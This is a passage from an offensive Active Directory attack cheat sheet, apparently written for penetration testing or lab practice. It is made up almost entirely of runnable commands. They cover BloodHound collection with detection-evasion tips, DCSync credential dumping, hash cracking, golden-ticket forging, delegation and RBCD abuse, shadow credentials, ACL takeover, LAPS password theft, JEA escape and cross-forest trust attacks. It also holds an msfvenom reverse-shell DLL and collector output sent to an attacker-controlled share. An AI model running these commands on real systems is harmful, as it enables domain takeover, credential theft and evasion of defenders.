.\SharpHound.exe -c DCOnly -d [domain]

# stealth (only touch hosts likely to hold session data)
.\SharpHound.exe -c All --stealth

# session loop for transient logons (1h, every minute)
.\SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00

# target a computer list only
.\SharpHound.exe -c ComputerOnly --computerfile .\computers.txt

# alternate creds / non-domain host
.\SharpHound.exe -c All --ldapusername [user] --ldappassword [password] --domaincontroller [dc-ip]

Randomize and hide output artifacts (defeat .json/.bin/zip naming signatures):

.\SharpHound.exe -c All --memcache --randomfilenames --outputprefix HTB `
  --outputdirectory \\[attacker-ip]\share\ --zippassword [password]

From a non-domain-joined attack box, launch in a netonly context first:

runas /netonly /user:[domain]\[user] cmd.exe
# then run SharpHound.exe inside that shell

bloodhound-python (Linux) — prefer Kerberos so traffic looks normal (needs resolvable KDC via /etc/hosts or DNS):

# NTLM-fallback, custom nameserver
bloodhound-python -d [domain] -u [user] -p [password] -c All -ns [dc-ip] --zip

# Kerberos auth (DNS must resolve the DC FQDN)
bloodhound-python -d [domain] -u [user] -p [password] -c DCOnly -ns [dc-ip] -k --zip

AzureHound (Go, Entra/AzureAD + AzureRM via MS Graph / REST) — output one JSON for upload:

azurehound -u "[user]@[domain]" -p "[password]" list --tenant "[domain].onmicrosoft.com" -o all.json

RustHound / RustHound-CE (fast cross-platform AD collector, BloodHound CE format):

rusthound-ce -d [domain] -u [user]@[domain] -p [password] -i [dc-ip] -z

Ingesting into BloodHound CE — upload via the API or drag the zip into the UI:

# bulk upload all collector zips to a BloodHound CE instance
bloodhound-cli ingest *.zip
# or use the web UI: Administration -> File Ingest -> upload zip/JSON

Uploading multiple zips merges data; duplicates are ignored. Legacy BloodHound 4.x uses the Neo4j-backed Electron GUI instead (start neo4j, then drag-and-drop).

8.6.2 Common Analysis (Pre-Built Queries)

Run from the Analysis tab; the high-value ones for offense:

Goal Pre-built query
Kerberoastable accounts List all Kerberoastable Accounts / Shortest Paths from Kerberoastable Users
AS-REP roastable accounts Find AS-REP Roastable Users (DontReqPreAuth)
Quick wins to DA Find Shortest Paths to Domain Admins
Delegation abuse Shortest Paths to Unconstrained Delegation Systems
Move from compromised principals Shortest Paths from Owned Principals / to Domain Admins from Owned Principals
Cross-trust pivot Users/Groups with Foreign Domain Group Membership; Map Domain Trusts
Priority targets Shortest Paths to High-Value Targets

8.6.3 Custom Cypher Queries

Run these in the Neo4j browser (http://localhost:7474/browser) or the BloodHound Cypher box. Replace [domain] with the uppercase domain (e.g. @[DOMAIN].LOCAL).

Goal Cypher query
All Kerberoastable users MATCH (u:User {hasspn:true}) RETURN u.name
AS-REP roastable users MATCH (u:User {dontreqpreauth:true}) RETURN u.name
Unconstrained-delegation hosts MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
Passwords hidden in description MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name, u.description
List owned principals MATCH (n {owned:true}) RETURN n.name
Shortest path to DA MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@[domain]"})) WHERE NOT n=m RETURN p
Any node with a given edge (e.g. WriteSPN) MATCH p=((n)-[r:WriteSPN]->(m)) RETURN p

The PlainText "path from anything" query — after compromising [user], find every reachable target (not just DA/high-value). Swap shortestPath for allShortestPaths to see every relationship:

MATCH p = shortestPath((n)-[*1..]->(c))
WHERE n.name =~ '(?i)[user].*' AND NOT c=n
RETURN p

Rights the Domain Users group should never hold over a computer (low-privilege abuse paths):

MATCH p=(g:Group)-[r:Owns|WriteDacl|GenericAll|WriteOwner|ExecuteDCOM|GenericWrite|AllowedToDelegate|ForceChangePassword]->(c:Computer)
WHERE g.name STARTS WITH "DOMAIN USERS"
RETURN p

Enumerate effective local admins per host (direct AdminTo plus group-derived), ranked by admin count:

MATCH (c:Computer)
OPTIONAL MATCH (u1:User)-[:AdminTo]->(c)
OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c)
WITH COLLECT(u1) + COLLECT(u2) AS TempVar, c
UNWIND TempVar AS Admins
RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT, COLLECT(DISTINCT(Admins.name)) AS USERS
ORDER BY ADMIN_COUNT DESC

Useful Cypher idioms: 1..* matches a path of any depth; =~ '(?i)...' applies a case-insensitive regex; CONTAINS / STARTS WITH filter on substrings. Save reusable queries to customqueries.json (~/.config/bloodhound on Linux, %AppData%\Roaming\bloodhound on Windows) so they appear under the Custom Queries tab.

8.6.4 Marking Owned / High-Value & Pathfinding

  • Right-click any compromised node → Mark as Owned (sets owned:true, skull icon). Then run Shortest Paths to Domain Admins from Owned Principals to chain footholds.
  • DA / Enterprise Admins are high value by default; right-click → Mark as High Value to add custom targets, then use Shortest Paths to High-Value Targets.
  • Pathfinding: set a start node and end node, then filter out edges you can't or won't abuse (e.g. uncheck ForceChangePassword) to surface an alternative path.
  • If a node has no path to DA/high-value, the "path from anything" query above still reveals lateral options (a host, GPO, group, or ACL) the pre-built queries miss.

An owned-driven custom query that prompts for a marked node and pathfinds from it (drop into customqueries.json):

MATCH p = allShortestPaths((n)-[*1..]->(c))
WHERE n.name = $result AND NOT c=n
RETURN p

9. Active Directory Exploitation

9.1 Unconstrained Delegation

Unconstrained delegation lets a service impersonate any authenticating user by caching their TGT. Steal a cached ticket or force authentication to capture one.

  • Requires control of a machine with unconstrained delegation set
  • SpoolSample forces a target DC/server to authenticate to your compromised host
  • Once you hold a Domain Admin or DC TGT, DCSync or Golden Ticket creation becomes available
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

9.1.1 Option 1: Force Authentication (SpoolSample)

# Verify the print spooler pipe is reachable on the target
dir \\[domain]\pipe\spoolss

# Monitor for incoming TGTs on the compromised delegation host
Rubeus.exe monitor /interval:1 /nowrap

# Trigger authentication from target server to your compromised host
SpoolSample.exe [target-server] [your-compromised-server]

# Inject the captured Base64 TGT
Rubeus.exe ptt /ticket:[base64-tgt]
klist

9.1.2 Option 2: Ticket Already in Memory

# Export all cached tickets
sekurlsa::tickets /export

# Inject a .kirbi ticket
kerberos::ptt [ticket].kirbi

# Access resources under the injected identity
dir \\[ip]\C$
PsExec.exe \\[ip] cmd
Enter-PSSession -ComputerName [ip]

9.2 DCSync

Impersonate a DC to pull password hashes directly via the replication protocol. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All (typically held by Domain Admins / Enterprise Admins).

# Confirm replication rights
Import-Module ActiveDirectory
$domainDN = (Get-ADDomain).DistinguishedName
(Get-ACL "AD:$domainDN").Access |
  Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight } |
  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType, InheritanceType

# Alternative: dump ACL to file and grep
dsacls "DC=[domain],DC=com" > domain_acl.txt
findstr /I "Replicating Directory Changes" domain_acl.txt
findstr /I "Replicating Directory Changes All" domain_acl.txt

# DCSync from Windows — all hashes
lsadump::dcsync /domain:[domain]

# Single user (e.g. krbtgt)
lsadump::dcsync /domain:[domain] /user:[user]
lsadump::dcsync /domain:[domain] /user:krbtgt

# All hashes to CSV via one-liner
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:[domain] /all /csv" "exit"

# DCSync from Kali with credentials
impacket-secretsdump [domain]/[user]:"[password]"@[dc-ip]

# Single user
impacket-secretsdump -just-dc-user [user] [domain]/[user]:"[password]"@[dc-ip]

# Crack dumped NTLM hashes
hashcat -m 1000 [hash-file] /usr/share/wordlists/rockyou.txt

9.3 Golden Tickets

Forge a TGT signed with the krbtgt NTLM hash to impersonate any domain user indefinitely.

  • Need: domain FQDN, domain SID, krbtgt NTLM hash, target account RID (Administrator = 500)
  • Ticket is crafted entirely offline — no DC contact needed until use
  • Survives password resets on all accounts except krbtgt
# Get domain SID
(Get-ADDomain).DomainSID

# Dump krbtgt hash
lsadump::dcsync /domain:[domain] /user:krbtgt

# Resolve RID for a non-Administrator account
(New-Object System.Security.Principal.NTAccount('[domain]\[user]')).Translate([System.Security.Principal.SecurityIdentifier]).Value

# Craft golden ticket (Administrator)
kerberos::golden /user:Administrator /domain:[domain] /sid:[domain-sid] /krbtgt:[hash] /id:500

# Craft golden ticket (arbitrary account)
kerberos::golden /user:[user] /domain:[domain] /sid:[domain-sid] /krbtgt:[hash] /id:[rid]

# Inject and verify
kerberos::ptt "C:\path\to\golden_ticket.kirbi"
klist

# Access resources
dir \\[ip]\C$
PsExec.exe \\[ip] cmd
Enter-PSSession -ComputerName [ip]

9.4 LAPS

LAPS stores per-machine local Administrator passwords in ms-Mcs-AdmPwd. Read access to that attribute is restricted by ACL; enumerate who can read it and harvest accordingly.

TaskToolCommand / Attribute
Check LAPS installed (local)PowerShellGet-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Check LAPS installed (AD)PowerShellGet-ADObject 'CN=ms-mcs-admpwd,CN=Schema,...'
Find LAPS-managed hostsPowerViewGet-DomainComputer -Filter "(ms-mcs-admpwdexpirationtime=*)"
Read passwordPowerViewGet-DomainComputer -identity [host] -properties ms-Mcs-AdmPwd
Find LAPS GPOPowerViewGet-DomainGPO | ? { $_.DisplayName -like "*laps*" }
Who can read passwordPowerViewGet-DomainOU | Get-DomainObjectAcl ... -ObjectAceType ms-Mcs-AdmPwd
 
# Find LAPS-managed hosts (expiration time readable by any user)
Get-DomainComputer -Filter "(ms-mcs-admpwdexpirationtime=*)" | select dnshostname
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# Read LAPS password (requires ms-Mcs-AdmPwd read rights)
Get-DomainComputer -identity [host] -properties ms-Mcs-AdmPwd
Get-DomainComputer | Select-Object 'dnshostname','ms-mcs-admpwd' | Where-Object {$_."ms-mcs-admpwd" -ne $null}

# Via native AD module
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

# Via ADSI searcher
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}

# Confirm local installation
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'

# Find LAPS-related GPOs
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
Get-DomainGPO | ? { $_.DisplayName -like "*password solution*" } | select DisplayName, Name, GPCFileSysPath | fl

# Enumerate who can read ms-Mcs-AdmPwd per OU
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }

9.5 Constrained Delegation

Constrained delegation limits a compromised account to the SPNs listed in its msDS-AllowedToDelegateTo property. With TRUSTED_TO_AUTH_FOR_DELEGATION set, S4U2Self/S4U2Proxy (protocol transition) let you request a ticket for any user to those services without their credentials.

  • Compromise the frontend account (cleartext, NTLM hash, or AES key) — you do not need to run as it; impacket works from Kali with the hash
  • S4U2Self mints a forwardable TGS for any user to the frontend; S4U2Proxy then mints a TGS for the target SPN — impersonate a Domain Admin to a delegated service (e.g. MSSQL, CIFS, HTTP)
  • You may rewrite the SPN service class in the returned ticket (e.g. swap to CIFS/HOST) to broaden access on the same host
# Enumerate accounts trusted for constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
# Read the allowed-to-delegate-to SPNs
Get-DomainUser [user] -Properties samaccountname,msds-allowedtodelegateto,useraccountcontrol

# Rubeus — S4U from Windows (impersonate a user to a delegated SPN)
Rubeus.exe s4u /user:[user] /rc4:[hash] /impersonateuser:administrator /msdsspn:[spn] /ptt
# /altservice rewrites the SPN class in the resulting TGS (e.g. cifs, host, ldap)
Rubeus.exe s4u /user:[user] /aes256:[key] /impersonateuser:administrator /msdsspn:mssqlsvc/[host]:1433 /altservice:cifs /ptt

# impacket — request TGT for the delegating account, then S4U from Kali
impacket-getTGT [domain]/[user] -hashes :[hash]
export KRB5CCNAME=[user].ccache
impacket-getST -spn mssqlsvc/[host]:1433 -impersonate administrator [domain]/[user] -k -no-pass
# Use the impersonated ticket
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient [host] -k

9.6 Resource-Based Constrained Delegation

RBCD reverses the trust: the backend resource lists who may delegate to it in msDS-AllowedToActOnBehalfOfOtherIdentity. Write access over a computer object (GenericAll/GenericWrite/WriteDacl/WriteProperty) lets you set that attribute to an account you control and then S4U into the target as any user.

  • The "delegate-from" principal must have an SPN — user accounts usually don't, so create/own a machine account (default ms-DS-MachineAccountQuota = 10 lets any user add up to 10)
  • Write your controlled account's SID into the target's msDS-AllowedToActOnBehalfOfOtherIdentity security descriptor
  • S4U2Self + S4U2Proxy with the controlled account then impersonate any user (e.g. administrator) to a chosen SPN on the target — CIFS access converts to SYSTEM via psexec
# Find write permissions over computer objects (delegation foothold)
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
# Check the machine account quota
Get-DomainObject -Identity [domain] -Properties ms-DS-MachineAccountQuota

# PowerMad — create a computer account from Windows
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password (ConvertTo-SecureString '[password]' -AsPlainText -Force)

# impacket — create a computer account from Kali
impacket-addcomputer -computer-name 'myComputer$' -computer-pass '[password]' [domain]/[user] -hashes :[hash]

# PowerView — set RBCD on the target (allow myComputer$ to act on its behalf)
$sid = (Get-DomainComputer myComputer -Properties objectsid).objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$bytes = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($bytes,0)
Set-DomainObject [target-computer] -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}

# rbcd.py — set the attribute from Kali
impacket-rbcd -action write -delegate-to '[target-computer]$' -delegate-from 'myComputer$' [domain]/[user] -hashes :[hash]

# S4U as the controlled machine account, then code exec as SYSTEM
impacket-getST -spn cifs/[host] -impersonate administrator '[domain]/myComputer$:[password]'
export KRB5CCNAME=administrator.ccache
impacket-psexec administrator@[host] -k -no-pass

# Equivalent S4U on Windows with Rubeus (machine account hash)
Rubeus.exe s4u /user:myComputer$ /rc4:[hash] /impersonateuser:administrator /msdsspn:cifs/[host] /ptt

9.7 Shadow Credentials

If you can write msDS-KeyCredentialLink on a user or computer (GenericWrite/GenericAll), add an attacker-controlled certificate as a "key credential" and authenticate via PKINIT to obtain a TGT — and the account's NT hash — without changing its password.

// Whisker — add a key credential from Windows
Whisker.exe add /target:[user]
// Outputs a ready-to-run Rubeus asktgt command with the generated cert
Whisker.exe list /target:[user]
Whisker.exe remove /target:[user] /deviceid:[guid]

# pyWhisker — add a key credential from Kali (saves a PFX)
pywhisker -d [domain] -u [user] -p [password] --target [target] --action add

# Certipy — shadow credentials in one step (auto PKINIT -> TGT + NT hash)
certipy shadow auto -u [user]@[domain] -p [password] -account [target] -dc-ip [dc-ip]

# Rubeus — request a TGT with the generated certificate (PKINIT)
Rubeus.exe asktgt /user:[target] /certificate:[base64-pfx] /password:[pfx-password] /getcredentials /ptt

# gettgtpkinit — request a TGT with the PFX from Kali
gettgtpkinit.py -cert-pfx [target].pfx -pfx-pass [pfx-password] [domain]/[target] [target].ccache
Delegation typeKey attributePreconditionTooling
Unconstrained userAccountControl (TRUSTED_FOR_DELEGATION) Control of the delegation host; user/DC must authenticate to it (coerce via SpoolSample) Rubeus, Mimikatz, krbrelayx
Constrained msDS-AllowedToDelegateTo (+ TRUSTED_TO_AUTH_FOR_DELEGATION for protocol transition) Compromise of the frontend account (hash/key); limited to listed SPNs Rubeus s4u, impacket-getST
Resource-Based (RBCD) msDS-AllowedToActOnBehalfOfOtherIdentity Write rights over the target computer object; an SPN-holding account to delegate from PowerMad/addcomputer.py, PowerView/rbcd.py, Rubeus/getST
Shadow Credentials msDS-KeyCredentialLink GenericWrite/GenericAll over the target user or computer Whisker, pyWhisker, Certipy, Rubeus asktgt

9.8 ACL & Object Permission Abuse

Every AD object has a DACL of ACEs (right / principal / type). All authenticated users can read object DACLs, so weak ACLs are enumerable from any low-privilege account.

9.8.1 Enumerating ACLs

# PowerView (PowerShell v2) — dump ACEs for a single object
. .\powerview.ps1
Get-ObjectAcl -Identity [user] -ResolveGUIDs

# PowerView v3 equivalent
Get-DomainObjectAcl -Identity [user] -ResolveGUIDs

# Resolve each SID, then keep only ACEs granted to the current user
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# Filter computer objects for a specific right (e.g. RBCD prep)
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }

# Translate a SID to a readable name
ConvertFrom-SID [sid]

# SharpHound collector — feed the zip into the BloodHound GUI to map ACL attack paths
.\SharpHound.exe -c All

# Linux collector against the DC
bloodhound-python -d [domain] -u [user] -p [password] -dc [dc-ip] -ns [dc-ip] -c All

9.8.2 GenericAll / GenericWrite

GenericAll = full control; GenericWrite = write non-protected properties. Both allow password reset on a user, SPN injection for a targeted Kerberoast, or self-add on a group.

# Reset a user's password (GenericAll over the user object) — no old password needed
net user [user] [password] /domain

# Linux: reset password over LDAP
net rpc password [user] [password] -U [domain]/[attacker-user]%[attacker-pass] -S [dc-ip]

# Set an SPN to make the target Kerberoastable (GenericWrite, no password reset needed)
Set-DomainObject -Identity [user] -Set @{serviceprincipalname='fake/svc'}

# Then roast and crack offline
impacket-GetUserSPNs [domain]/[attacker-user]:[attacker-pass] -dc-ip [dc-ip] -request-user [user]

# Add yourself to a group you have GenericAll/GenericWrite over
net group [group] [user] /add /domain

# Linux equivalent
net rpc group addmem "[group]" "[user]" -U [domain]/[attacker-user]%[attacker-pass] -S [dc-ip]

9.8.3 WriteDACL / WriteOwner

WriteDACL lets you edit the object's DACL and grant yourself any right; WriteOwner lets you take ownership, which then implies WriteDACL. The usual chain on a high-value object is take ownership → grant GenericAll/DCSync → abuse.

# Grant yourself GenericAll (WriteDACL over the target)
Add-DomainObjectAcl -TargetIdentity [user] -PrincipalIdentity [attacker-user] -Rights All

# Grant DCSync rights when the target is the domain object
Add-DomainObjectAcl -TargetIdentity "DC=[domain],DC=com" -PrincipalIdentity [attacker-user] -Rights DCSync

# Take ownership (WriteOwner), then you can edit the DACL
Set-DomainObjectOwner -Identity [user] -OwnerIdentity [attacker-user]

# Linux: add an ACE (e.g. grant full control / DCSync) with impacket
impacket-dacledit -action write -rights FullControl -principal [attacker-user] -target [user] [domain]/[attacker-user]:[attacker-pass]

# Linux: take ownership with impacket
impacket-owneredit -action write -new-owner [attacker-user] -target [user] [domain]/[attacker-user]:[attacker-pass]

# With DCSync granted, replicate the krbtgt hash
impacket-secretsdump [domain]/[attacker-user]:[attacker-pass]@[dc-ip] -just-dc-user krbtgt

9.8.4 ForceChangePassword & AddMember

ForceChangePassword (an extended right) resets a user's password without the old one; AddMember/WriteProperty on the member attribute adds principals to a group.

# Force-change a user's password via PowerView
$pw = ConvertTo-SecureString '[password]' -AsPlainText -Force
Set-DomainUserPassword -Identity [user] -AccountPassword $pw

# Linux: ForceChangePassword over SAMR/LDAP
net rpc password [user] [password] -U [domain]/[attacker-user]%[attacker-pass] -S [dc-ip]

# Add a member (WriteProperty on the group's member attribute)
Add-DomainGroupMember -Identity [group] -Members [user]

# Linux: add a group member via impacket
impacket-net -k -no-pass [domain]/[attacker-user] group "[group]" -add -member [user]
ACE Right Abuse Tooling
GenericAll Full control: reset password, set SPN, add to group, RBCD net user / Set-DomainObject / impacket-dacledit
GenericWrite Write non-protected attrs: targeted Kerberoast (SPN), RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), logon script Set-DomainObject / impacket-rbcd
WriteDACL Grant yourself GenericAll or DCSync on the object/domain Add-DomainObjectAcl / impacket-dacledit
WriteOwner Take ownership → gain WriteDACL → grant rights Set-DomainObjectOwner / impacket-owneredit
ForceChangePassword Reset a user's password without the current one Set-DomainUserPassword / net rpc password
AddMember / WriteProperty (member) Add a principal to a group Add-DomainGroupMember / net group
AllExtendedRights Includes ForceChangePassword and (on domain) DCSync PowerView / impacket-secretsdump

9.9 JEA & JIT

Two hardening features that limit privileged access but become attack surface when misconfigured. JEA is enforced by PowerShell remoting (not AD); JIT relies on time-boxed group membership and (for AD-integrated solutions) the Privileged Access Management feature.

9.9.1 Enumerating JEA Endpoints

JEA exposes constrained PowerShell endpoints via WinRM using a named -ConfigurationName. Hunt for endpoint names in PowerShell history, group/GPO names and description fields.

# PowerShell history often leaks the endpoint name and prior Enter-PSSession usage
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# List registered session configurations on a reachable host
Get-PSSessionConfiguration

# Connect to the named JEA endpoint
Enter-PSSession -ComputerName [host] -ConfigurationName [config-name]

9.9.2 Escaping a Constrained JEA Session

  • A hardened endpoint runs RestrictedRemoteServer + NoLanguageMode — only a handful of functions plus admin-defined visible cmdlets. Commands run as the virtual account (local Administrators).
  • If SessionType=Default it runs FullLanguageMode — you can define functions and have effectively full admin access.
  • Escape comes from an unvalidated allowed cmdlet that gives file write or process creation while running as admin.
# Enumerate what the constrained session actually allows
Get-Command

# An unvalidated Copy-Item = arbitrary admin file write (e.g. drop a hijack DLL)
Copy-Item -Path '[source]' -Destination 'C:\Program Files\[app]\[name].dll'

# Build a payload DLL for a DLL-search-order hijack against the target service
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f dll -o [name].dll

Commands to flag as dangerous if visible in a JEA role: Invoke-Expression, Start-Process, Invoke-Command, Copy-Item (write), and any cmdlet exposing the FileSystem provider.

9.9.3 Enumerating JIT (PAM)

AD-integrated JIT requires the Privileged Access Management feature (forest mode 2016+); once enabled it cannot be disabled and is enumerable by any user.

# AD module DLL loads without admin; import then enumerate optional features
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Get-ADOptionalFeature -Filter * | ? { $_.Name -like '*Privileged Access*' }

# Look for request/approve groups behind a JIT portal (naming conventions, members)
Get-NetGroup '*request*','*approve*' | select samaccountname
Get-NetGroup [approve-group] | select member

# Map a JIT group to the machine it grants admin on via the GPO Groups.xml in SYSVOL
Get-NetGPO | select displayname
type \\[domain]\SysVol\[domain]\Policies\{[gpo-guid]}\MACHINE\Preferences\Groups\Groups.xml

9.9.4 Abusing JIT Access

After a request is approved your account joins the privileged group, but your existing Kerberos TGT predates the membership — refresh it before the new rights apply.

# Purge cached tickets so the next service request issues a fresh TGT with the new group
klist purge

# Reconnect — the new TGT now carries the granted group (e.g. local admin via WinRM)
Enter-PSSession -ComputerName [host]

# No interactive logon? Refresh the TGT directly with creds/hash (impacket)
impacket-getTGT [domain]/[user]:[password]
export KRB5CCNAME=[user].ccache

9.10 Domain & Forest Trust Attacks

A forest is only as strong as its least secure domain. Intra-forest trusts are not a security boundary; a child-domain compromise leads straight to Enterprise Admin. Forest trusts are a boundary, but SID filtering can be relaxed or bypassed under common conditions.

9.10.1 Enumerating Trusts

# PowerView - domain trusts (LDAP, .NET, or Win32 API)
Get-DomainTrust
Get-DomainTrust -API            # DsEnumerateDomainTrusts
Get-DomainTrust -NET            # .NET GetAllTrustRelationships
Get-DomainTrust -Domain [domain]
# Forest trusts and full recursive map
Get-ForestTrust
Get-DomainTrustMapping
# Enumerate across a trust (users / groups / delegation)
Get-DomainUser -Domain [domain]
Get-DomainGroupMember -Identity "Administrators" -Domain [domain]
# Foreign principals: members of a trusted domain's groups from our domain
Get-DomainForeignGroupMember -Domain [domain]
# .NET (no tooling on disk)
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
# nltest - built-in trust enumeration
nltest /trusted_domains
nltest /domain_trusts /all_trusts
# SharpHound / BloodHound ingestor maps trusts across the whole forest
SharpHound.exe -c All,Trusts

9.10.2 Child-to-Parent (SID History)

Intra-forest escalation from Domain Admin of a child domain to Enterprise Admin of the root. A golden ticket forged with the child krbtgt hash carries the root domain's Enterprise Admins SID in the ExtraSids field; the child DC re-signs the referral TGT with the trust key before it reaches the parent.

  • Need: child krbtgt NTLM hash (DCSync as child DA), child domain SID, and root domain SID.
  • ExtraSid = [root-domain-sid]-519 (Enterprise Admins is a static RID 519).
  • The forged username need not exist; the ticket jumps directly to the root with EA membership.
  • Works within a forest because intra-forest SID filtering does not strip the ExtraSids of the root domain.
# DCSync the child krbtgt + resolve both domain SIDs (PowerView / Mimikatz)
Get-DomainSID -Domain [child-domain]
Get-DomainSID -Domain [domain]
# lsadump::dcsync /domain:[child-domain] /user:[child-domain]\krbtgt
# Mimikatz - golden ticket with ExtraSid = root Enterprise Admins
kerberos::golden /user:h4x /domain:[child-domain] /sid:[child-domain-sid] /krbtgt:[hash] /sids:[domain-sid]-519 /ptt
# Rubeus equivalent (forge + inject)
Rubeus.exe golden /rc4:[hash] /user:h4x /domain:[child-domain] /sid:[child-domain-sid] /sids:[domain-sid]-519 /ptt
# Impacket - automate the whole child-to-parent escalation
raiseChild.py [child-domain]/[user]:[password]
# Or forge the ticket directly with the child krbtgt hash
ticketer.py -nthash [hash] -domain-sid [child-domain-sid] -domain [child-domain] -extra-sid [domain-sid]-519 h4x

9.10.3 Cross-Forest Abuse

A forest trust is a security boundary: SID filtering strips ExtraSids when a referral TGT crosses it, so the child-to-parent ExtraSid trick fails by default. Cross-forest compromise relies on relaxed filtering, foreign principals, or the trust key.

  • The inter-realm trust key is the password hash of the trust account (e.g. [domain]$), shared between both sides of a bi-directional trust. DCSync it like any user.
  • A referral TGT for the foreign realm is signed with the trust key, not the local krbtgt; forging one lets you request a TGS in the trusted forest.
  • Hunt foreign group membership (Get-DomainForeignGroupMember) and ACLs - a local user added to a foreign group, or same-name accounts sharing a password, is a clean entry point.
# DCSync the inter-forest / inter-domain trust key (trust account hash)
# lsadump::dcsync /domain:[domain] /user:[trusted-domain]$
# Forge an inter-realm referral TGT with the trust key, then ask the foreign DC for a TGS
ticketer.py -nthash [hash] -domain-sid [domain-sid] -domain [domain] -spn krbtgt/[target-domain] [user]
getST.py -k -no-pass -spn cifs/[host].[target-domain] [domain]/[user]
# Rubeus - forge a cross-forest referral ticket from the trust key
Rubeus.exe asktgs /service:cifs/[host].[target-domain] /domain:[target-domain] /dc:[dc-ip] /ticket:[base64-referral-tgt] /ptt
# SID-history bypass: external/TREAT_AS_EXTERNAL trust forwards SIDs with RID >= 1000.
# Forge a golden ticket carrying a foreign DOMAIN LOCAL group (e.g. builtin Administrators / powerGroup).
kerberos::golden /user:h4x /domain:[domain] /sid:[domain-sid] /krbtgt:[hash] /sids:[target-domain-sid]-[rid] /ptt
Scenario Technique Tool
Child DA → forest root EA Golden ticket + ExtraSids (Enterprise Admins SID, RID 519) mimikatz kerberos::golden, Rubeus golden, raiseChild.py, ticketer.py
Child DA → root via coercion Printer bug against root DC + unconstrained delegation host → DC TGT → DCSync SpoolSample/krbrelayx + Rubeus monitor + dcsync
Cross-forest, SID filtering relaxed ExtraSids with foreign domain-local group, RID ≥ 1000 (TREAT_AS_EXTERNAL) mimikatz kerberos::golden, ticketer.py
Cross-forest, trust key known Forge inter-realm referral TGT, request foreign TGS ticketer.py + getST.py, Rubeus asktgs
Foreign group membership / ACL Abuse local user added to a trusted-forest group or with foreign ACL rights Get-DomainForeignGroupMember, BloodHound
Same-name accounts across forests Password reuse spray against the trusted forest Get-DomainUser -Domain, crackmapexec
Linked MSSQL across trust Follow linked server to sa context → xp_cmdshell in foreign forest sp_linkedservers, PowerUpSQL, mssqlclient.py

SID filtering notes:

  • Intra-forest (parent-child) trusts do not filter the root domain's SIDs, so child-to-parent ExtraSids escalation succeeds by default.
  • Forest/external trusts apply SID filtering: any SID with RID < 1000 is always stripped, regardless of settings.
  • Enabling SID history (netdom trust [domain] /d:[trusted-domain] /enablesidhistory:yes) marks the trust TREAT_AS_EXTERNAL; SIDs with RID ≥ 1000 then pass.
  • Even with SID history on, membership injected via a global group (Domain/Enterprise Admins) is still filtered - only domain local groups (e.g. builtin Administrators) survive.

9.11 AD Certificate Services (ADCS)

ADCS is the Active Directory PKI; certificates act as long-lived, persistent credentials that survive password resets. Misconfigured templates or CA settings let an unprivileged user enrol an authentication certificate as a privileged principal, then exchange it for a TGT via PKINIT — escalating to Domain Admin. The two load-bearing fields are SubjectAlternativeName (SAN, who the cert authenticates as) and Extended Key Usage (EKU, e.g. Client Authentication 1.3.6.1.5.5.7.3.2, Smart Card Logon 1.3.6.1.4.1.311.20.2.2).

9.11.1 Enumeration

Locate the Enterprise CA and any templates/CA flags marked vulnerable.

# Certify (Windows) — vulnerable templates, all templates, CA list
Certify.exe find /vulnerable
Certify.exe find
